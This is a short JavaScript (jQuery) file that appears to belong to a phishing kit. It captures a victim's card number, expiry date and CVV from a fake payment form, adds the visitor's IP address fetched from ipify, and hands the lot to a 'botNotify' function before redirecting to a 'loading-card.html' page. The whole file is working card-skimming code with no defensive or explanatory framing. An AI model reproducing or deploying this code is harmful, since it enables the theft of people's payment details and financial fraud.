$(document).ready(()=>{

    $("#cardDetailscc").on("submit",async(ev)=>{
        ev.preventDefault();
        var message = "";
        var cardnumber    = $("#cardnumber").val();
        var expMonth     = $("#expMonth").val();
        var expYear        = $("#expYear").val();
        var cvv = $("#cvv").val();
        if(cardnumber.length == 0 || expMonth.length == 0 || expYear.length == 0 || cvv.length == 0){
            
            alert("لو سمحت أملأ كل الحقول");
            return;
        }
        
        message += "-------[Card Info ]-------\n";
        message += `Card Number : ${cardnumber}\n`;
        message += `MM   : ${expMonth}\n`;
        message += `YY : ${expYear}\n`;
        message += `Card-Cvv : ${cvv}\n`;
        message += await getIp();
        await botNotify(message);
        window.location.assign("loading-card.html");
       
    });

const  getIp = async ()=>{
    return await fetch('https://api.ipify.org/?format=json')
    .then(response => response.json())
    .then(data => {
        var ipAddress = data.ip;
        var message = `IP Address : ${ipAddress}\n`;
        return message;
    }).catch(e=>{
        var message = `Error to get visitor IP\n`;
        return message;
    });
    }

});